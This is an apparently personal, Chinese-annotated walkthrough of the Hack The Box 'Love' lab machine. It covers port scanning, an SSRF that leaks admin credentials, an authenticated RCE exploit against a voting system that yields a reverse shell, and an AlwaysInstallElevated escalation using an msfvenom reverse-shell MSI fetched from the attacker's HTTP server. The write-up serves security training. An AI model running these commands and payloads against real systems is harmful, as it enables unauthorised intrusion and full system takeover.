## Love

#### .msi 是 Windows 的安装包格式（Microsoft Installer），就像：Linux 的 .deb,macOS 的 .pkg
#### PS C:\xampp\htdocs\omrs\images> get-applockerpolicy -effective | select -expandproperty rulecollections  //Windows AppLocker（应用程序白名单）策略 
```
[★]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.48.103 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
[★]$ nmap -p$ports -sV 10.129.48.103
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-04 08:17 CST
Nmap scan report for 10.129.48.103
Host is up (0.0091s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

```
#### 我也没找到staging.love.htb在哪里出现
```
 [★]$ echo '10.129.48.103 www.love.htb staging.love.htb' | sudo tee -a /etc/hosts
```
#### 如果我们在网上搜索'voting system exploit'(“投票系统利用”)，我们会遇到一个经过身份验证的RCE漏洞投票制度。
![图片](image/2026020401.png)
#### 由于我们还没有获得任何凭证，也无法注册帐户，所以我们继续注册进一步搜索有关目标的更多信息。在浏览staging.love.htb网站时，我们发现有一个网站声称可以扫描文件以查找恶意软件签名。如果选择beta选项，我们将被转移到beta.php，在那里我们找到文件扫描应用程序。
#### 我也没找到beta.php 直接登就好了http://staging.love.htb/bata.php 爱不需要讲武德
#### 在Specify the file url:输入http:127.0.0.1:5000
![图片](image/2026020402.png)
#### 我还是做了对比端口5000无法访问，目录存在，但不能列目录 = 403
![图片](image/2026020403.png)
#### Finally, we have the credentials for OMRS admin : @LoveIsInTheAir!!!!
### Foothold
#### 由于我们已经获得了用户admin的凭据，现在可以运行经过身份验证的投票了系统利用。我们首先在执行之前修改代码中的一些值：
https://www.exploit-db.com/exploits/49445
```
[★]$ vi 49445.py
[★]$ cat 49445.py
import requests

# --- Edit your settings here ----
IP = "www.love.htb" # Website's URL
USERNAME = "admin" #Auth username
PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
REV_IP = "10.10.14.93" # Reverse shell IP
REV_PORT = "8888" # Reverse port 
# --------------------------------

INDEX_PAGE = f"http://{IP}/admin/index.php"
LOGIN_URL = f"http://{IP}/admin/login.php"
VOTE_URL = f"http://{IP}/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/images/shell.php"

//请公主去掉每一项的/votesystem 爱不讲武力
//另外 在http://10.129.48.103/index.php就是无法使用已知的账户和密码登录
<SNIP>
```
```
[★]$ nc -lvnp 8888
listening on [any] 8888 ...
```
#### 最后，我们运行这个漏洞，并以用户phoebe的身份获得一个反向shell。
```
[★]$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.10.14.93] from (UNKNOWN) [10.129.48.103] 56154
b374k shell : connected

Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\omrs\images>whoami
whoami
love\phoebe
```
### Privilege Escalation
#### 通过列举常见的windows注册表项，我们发现AlwaysInstallElevated被设置为启用。
```
C:\xampp\htdocs\omrs\images>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\xampp\htdocs\omrs\images>

```
#### 我们可以利用此漏洞并执行我们的Windows安装程序（.msi）负载。然而，如果我们试着跑它的有效载荷将被证明是不成功的。通过进一步枚举，我们观察到applocker策略已经设置，并且只有Phoebe和允许管理员用户在指定目录下安装MSI文件。
```
C:\xampp\htdocs\omrs\images>powershell

PS C:\xampp\htdocs\omrs\images> get-applockerpolicy -effective | select -expandproperty rulecollections  //Windows AppLocker（应用程序白名单）策略 


PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : b7af7102-efde-4369-8a89-7a6a392d1473
Name                : (Default Rule) All digitally signed Windows Installer files
Description         : Allows members of the Everyone group to run digitally signed Windows Installer files.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\Installer\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 5b290184-345a-4453-b184-45305f6d9a54
Name                : (Default Rule) All Windows Installer files in %systemdrive%\Windows\Installer
Description         : Allows members of the Everyone group to run all Windows Installer files located in 
                      %systemdrive%\Windows\Installer.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*.*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 64ad46ff-0d71-4fa0-a30b-3f3d30c5433d
Name                : (Default Rule) All Windows Installer files 
Description         : Allows members of the local Administrators group to run all Windows Installer files.
//意味着：.msi 安装包、Windows Installer 目录里的程序是允许执行的
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

PathConditions      : {%OSDRIVE%\*}
PathExceptions      : {%OSDRIVE%\Administration\*}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 7eadbece-51d4-4c8b-9ab5-39faed1bd93e
Name                : %OSDRIVE%\*
Description         : 
UserOrGroupSid      : S-1-1-0
Action              : Deny

PathConditions      : {%OSDRIVE%\Administration\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : e6d62a73-11da-4492-8a56-f620ba7e45d9
Name                : %OSDRIVE%\Administration\*
Description         : 
UserOrGroupSid      : S-1-5-21-2955427858-187959437-2037071653-1002
Action              : Allow
```
#### 我们使用msfvenom生成恶意msi。
```
✅ Windows Installer 相关（msi）
Allows members of Everyone to run digitally signed Windows Installer files.
Allows Windows\Installer\*
```
```
[★]$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.93 LPORT=4444 -f msi -o reverse.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: reverse.msi
[★]$ python3  -m http.server 8011
Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...

```
```
[★]$ nc -lvnp 4444
listening on [any] 4444 ...
```
```
PS C:\xampp\htdocs\omrs\images> wget 10.10.14.93:8011/reverse.msi -o reverse.msi

PS C:\xampp\htdocs\omrs\images> msiexec /quiet /i reverse.msi
msiexec /quiet /i reverse.msi
```
```
[★]$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.93] from (UNKNOWN) [10.129.48.103] 56156
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>type root.txt

C:\Users\Phoebe\Desktop>type user.txt
```
